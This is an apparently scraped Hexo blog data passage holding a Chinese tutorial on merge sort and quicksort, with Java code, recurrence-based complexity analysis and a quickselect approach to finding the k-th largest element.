查找中间位置\nprivate static int partation(int[] arr, int left, int right) {\n    int base = arr[left];\n    int i = left, j = right;\n\n    while(i<j){\n        while (i<j && arr[j] >= base) j--;\n        while (i<j && arr[i] <= base) i++;\n\n        if (i<j){\n            int temp = arr[i];\n            arr[i] = arr[j];\n            arr[j] = temp;\n        }\n    }\n\n    arr[left] = arr[i];\n    arr[i] = base;\n    return i;\n\n}\n\n// 查找中间位置\nprivate static int partation1(int[] a, int left, int right){\n    int pivot = a[right];\n    int i = left;\n    for (int j=left; j<=right-1;j++){\n        if (a[j]<pivot){\n            int temp = a[i];\n            a[i] = a[j];\n            a[j] = temp;\n            i++;\n        }\n    }\n    a[right] = a[i];\n    a[i] = pivot;\n    return i;\n}\n```\n\n归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p...r]分区，函数返回pivot的小标。\n\n如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p...r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p...r]中。\n\n不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p...r]原地完成分区操作。\n\n原地分区函数的实现思路非常巧妙，我下面用伪代码实现：\n\n```java\npartation(a,p,r){\n    pivot := A[r]\n    i := p;\n\n    for j:=p to r-1 do {\n        if A[j] < pivot{\n            swap A[i] with A[j]\n            i := i+1\n        }\n    }\n    swap A[i] with A[r]\n    return i\n}\n```\n这里的处理有点类似于选择排序。我们通过游标i把A[p...r-1]分成了两部分，A[p...i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i...r-1] 是“未处理区间”。我们每次从未处理区间A[i...r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。\n\n数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。\n\n因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。\n\n到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？\n\n可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n\\*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 快速排序的性能分析\n{% endnote %}\n</div>\n\n现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。\n\n快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n\\*log_{2}n)$。\n\n$$ \n\\\\begin{cases} \\\\\\\n\\\\ T(1) = C; & n=1 \\\\\\\\[2ex]\n\\\\ T(n) = 2\\*T(\\frac{n}{2}) + n; &  n>1\n\\\\end{cases}\n$$\n\n但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。\n\n我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n\\*log_{2}n)$退化成了$O(n^2)$。\n\n我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？\n\n实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n\\*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。\n\n我们选择数组区间A[p...r]最后一个元素A[n-1]作为pivot，对数组A[0...n-1]进行原地分区，这样数组就分成了三部分，A[0...p-1]、A[p]、A[p+1...n-1]。\n\n\n如果p+1=K，那么A[p]就是要求解的元素，如果K>p+1，说明第K大元素出现在A[p+1...n-1]区间内，我们再按照上面的思路在A[p+1...n-1]内查找。同理，如果K< p+1，那我们就在A[0...p-1]区间内查找。\n\n我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？\n\n第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16......直到区间缩小为1.\n\n如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+......+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。\n\n归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。\n\n快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n\\*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。\n\n\n### 课后思考\n\n1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？\n\n多路归并、外排序\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-排序(中).md","raw":"---\ntitle: 算法-排序(中)\ndate: 2018-09-23 11:44:14\ntags: ['算法','排序','快速排序','归并排序','']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，**归并排序**和**快速排序**。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。\n\n归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：**如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？**，这就要用到今天讲的内容。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 归并排序的原理\n{% endnote %}\n</div>\n\n我们先来看看**归并排序**。\n\n归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。\n\n{% asset_img 归并排序原理图.jpg 归并排序原理图 %}\n\n归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。\n\n从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。**分治是一种解决问题的处理思想，递归是一种编程技巧**，这两者并不冲突。\n\n前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。\n\n我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。\n\n```java\n递推公式\nmerge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+1...r))\n\n终止条件\np>=r 不在继续分解\n```\n\n我来解释一下这个公式，merge_sort(p...r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p...q)和merge_sort(q+1...r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。\n\n有了递推公式，转化成代码就简单多了。\n\n```java\n// 归并排序\npublic static void merge_sort(int[] a, int n){\n    merge_sort(a, 0, n-1);\n}\nprivate static void merge_sort(int[] a, int p, int r){\n    // 递归终止条件\n    if (p>=r) return;\n    // 获取分区点\n    int q = p + (r-p)/2;\n    // 分治排序左边\n    merge_sort(a, p, q);\n    // 分治排序右边\n    merge_sort(a, q+1, r);\n    // 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r]\n    merge(a, p, q, r);\n}\n\n// 合并数组\nprivate static void merge(int[] a, int p, int q, int r){\n    int i = p;\n    int j = q + 1;\n    int k = 0;\n    // 合并数组 a[p, q]  a[q+1, r] 到临时数组temp\n    // 申请一个临时数组\n    int[] temp = new int[r - p + 1];\n    // 根据两个数组最短的长度进行比较添加到temp中\n    while (i<=q&& j<=r){\n        if (a[i]<=a[j]){\n            temp[k++] = a[i++];\n        }else {\n            temp[k++] = a[j++];\n        }\n    }\n\n    // 看哪个数组还没有完成，将其放到temp后\n    if (i<=q){\n        while (i<=q){\n            temp[k++] = a[i++];\n        }\n    }else {\n        while (j<=r){\n            temp[k++] = a[j++];\n        }\n    }\n    System.out.println(Arrays.toString(temp));\n\n    // 将temp中对应的数据放入原数组中\n    for (i = 0; i <= r-p; i++) {\n        a[p+i] = temp[i];\n    }\n}\n```\n\n你可能已经发现了，merge(A[p...r], A[p...q], A[q+1...r])这个函数的作用就是，讲已经有序的A[p...q]和A[q+1...r]合并成另一个有序的数组，并且放入A[p...r]。那这个过程具体该怎么做呢？\n\n如图所示，我们申请一个临时数组temp，大小与A[p...r]相同。我们用两个指针i，j分别指向A[p...q]和A[q+1...r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。\n\n继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p...r]中。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 归并排序的性能分析\n{% endnote %}\n</div>\n\n还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。\n\n**第一、 归并排序是稳定的排序算法吗？**\n\n结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。\n\n在合并的过程中，如果A[p...q]和A[q+1...r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p...q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。\n\n**第二、归并排序的时间复杂度是多少？**\n\n归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。\n\n在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。\n\n我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。\n\n从上面的分析，我们得出一个重要的结论：**不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式**。\n\n套用这个公式，我们来分析一下归并排序的时间复杂度。\n\n我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：\n$$ \n\\begin{cases}\nT(1) = C; & n=1 \\\\\\\\[2ex]\nT(n) = 2\\*T(\\frac{n}{2}) + n; &  n>1 \n\\end{cases}\n$$\n\n通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程\n\n$$\n\\\\begin{align\\*}\nT(n) \\\\ &= \\\\ 2\\*T(\\frac{n}{2}) \\\\ + \\\\ n \\\\\\\\[2ex]\n&= 2\\*(2 \\* T(\\frac{n}{4}) + \\frac{n}{2}) \\\\  + \\\\ n \\qquad = 4\\*T(\\frac{n}{4}) + 2\\*n \\\\\\\\[2ex]\n&= 4\\*(2\\* T(\\frac{n}{8}) + \\frac{n}{4}) \\\\  + \\\\ 2 \\* n \\\\ \\; = 8\\*T(\\frac{n}{8}) + 3\\*n \\\\\\\\[2ex]\n&= 8\\*(2\\* T(\\frac{n}{16}) + \\frac{n}{8}) \\\\  + \\\\ 3 \\* n \\\\ \\; = 16\\*T(\\frac{n}{16}) + 4\\*n \\\\\\\\[2ex]\n&= ...... \\\\\\\\[2ex]\n&= 2^{k} \\* T(\\frac{n}{2^{k}}) + k \\* n\n\\\\end{align\\*}\n$$\n\n这样一步步推导，我们可以得到$T(n) \\\\ = \\\\ 2^{k} \\* T(\\frac{n}{2^{k}}) + k \\* n $。当$T(\\frac{n}{2^{k}})=T(1)$时，也就是$\\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \\\\ = \\\\ Cn + n\\*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n\\*log_{2}n)$。所以归并排序的时间复杂度是$O(n\\*log_{2}n)$。\n\n从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n\\*log_{2}n)$。\n\n**第三、归并排序是不是原地排序算法呢？**\n\n归并排序的时间复杂度在任何情况下都是$O(n\\*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。\n\n这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n\\*log_{2}n)$，该如何分析呢？\n\n如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n\\*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？\n\n实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 快速排序的原理\n{% endnote %}\n</div>\n\n我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。\n\n快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。\n\n第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。\n\n根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。\n\n如果我们用递推公式来将上面的过程写出来的话，就是这样：\n\n```java\n# 递推公式\nquick_sort(p...r) = quick_sort(p...q-1)+quick_sort(q+1...r)\n\n# 终止条件\np>=r\n```\n\n我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。\n\n```java\nprivate static void quickSort(int[] arr, int n) {\n    if (n < 1) return;\n    quickSort(arr, 0 , n-1);\n}\nprivate static void quickSort(int[] arr, int left, int right) {\n    if (left>=right) return; \n    int mid = partation(arr, left, right);\n    quickSort(arr, left, mid-1);\n    quickSort(arr, mid+1, right);\n}\n\n// 查找中间位置\nprivate static int partation(int[] arr, int left, int right) {\n    int base = arr[left];\n    int i = left, j = right;\n\n    while(i<j){\n        while (i<j && arr[j] >= base) j--;\n        while (i<j && arr[i] <= base) i++;\n\n        if (i<j){\n            int temp = arr[i];\n            arr[i] = arr[j];\n            arr[j] = temp;\n        }\n    }\n\n    arr[left] = arr[i];\n    arr[i] = base;\n    return i;\n\n}\n\n// 查找中间位置\nprivate static int partation1(int[] a, int left, int right){\n    int pivot = a[right];\n    int i = left;\n    for (int j=left; j<=right-1;j++){\n        if (a[j]<pivot){\n            int temp = a[i];\n            a[i] = a[j];\n            a[j] = temp;\n            i++;\n        }\n    }\n    a[right] = a[i];\n    a[i] = pivot;\n    return i;\n}\n```\n\n归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p...r]分区，函数返回pivot的小标。\n\n如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p...r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p...r]中。\n\n不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p...r]原地完成分区操作。\n\n原地分区函数的实现思路非常巧妙，我下面用伪代码实现：\n\n```java\npartation(a,p,r){\n    pivot := A[r]\n    i := p;\n\n    for j:=p to r-1 do {\n        if A[j] < pivot{\n            swap A[i] with A[j]\n            i := i+1\n        }\n    }\n    swap A[i] with A[r]\n    return i\n}\n```\n这里的处理有点类似于选择排序。我们通过游标i把A[p...r-1]分成了两部分，A[p...i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i...r-1] 是“未处理区间”。我们每次从未处理区间A[i...r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。\n\n数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。\n\n因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。\n\n到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？\n\n可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n\\*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 快速排序的性能分析\n{% endnote %}\n</div>\n\n现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。\n\n快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n\\*log_{2}n)$。\n\n$$ \n\\\\begin{cases} \\\\\\\n\\\\ T(1) = C; & n=1 \\\\\\\\[2ex]\n\\\\ T(n) = 2\\*T(\\frac{n}{2}) + n; &  n>1\n\\\\end{cases}\n$$\n\n但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。\n\n我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n\\*log_{2}n)$退化成了$O(n^2)$。\n\n我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？\n\n实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n\\*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。\n\n我们选择数组区间A[p...r]最后一个元素A[n-1]作为pivot，对数组A[0...n-1]进行原地分区，这样数组就分成了三部分，A[0...p-1]、A[p]、A[p+1...n-1]。\n\n\n如果p+1=K，那么A[p]就是要求解的元素，如果K>p+1，说明第K大元素出现在A[p+1...n-1]区间内，我们再按照上面的思路在A[p+1...n-1]内查找。同理，如果K< p+1，那我们就在A[0...p-1]区间内查找。\n\n我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？\n\n第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16......直到区间缩小为1.\n\n如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+......+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。\n\n归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。\n\n快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n\\*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。\n\n\n### 课后思考\n\n1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？\n\n多路归并、外排序\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-排序(中)","published":1,"updated":"2019-06-26T03:52:03.523Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2no006eo25t1z8yi3dw","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，<strong>归并排序</strong>和<strong>快速排序</strong>。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。</p>\n<p>归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：<strong>如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？</strong>，这就要用到今天讲的内容。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"归并排序的原理\"><a href=\"#归并排序的原理\" class=\"headerlink\" title=\"归并排序的原理\"></a>归并排序的原理</h3></div><br></div>\n\n<p>我们先来看看<strong>归并排序</strong>。</p>\n<p>归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。</p>\n<img src=\"/posts/2018-09-23-算法-排序(中)/归并排序原理图.jpg\" title=\"归并排序原理图\">\n<p>归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。</p>\n<p>从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。<strong>分治是一种解决问题的处理思想，递归是一种编程技巧</strong>，这两者并不冲突。</p>\n<p>前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。</p>\n<p>我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">递推公式</span><br><span class=\"line\">merge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+<span class=\"number\">1</span>...r))</span><br><span class=\"line\"></span><br><span class=\"line\">终止条件</span><br><span class=\"line\">p&gt;=r 不在继续分解</span><br></pre></td></tr></table></figure>\n<p>我来解释一下这个公式，merge_sort(p…r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p…q)和merge_sort(q+1…r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。</p>\n<p>有了递推公式，转化成代码就简单多了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span 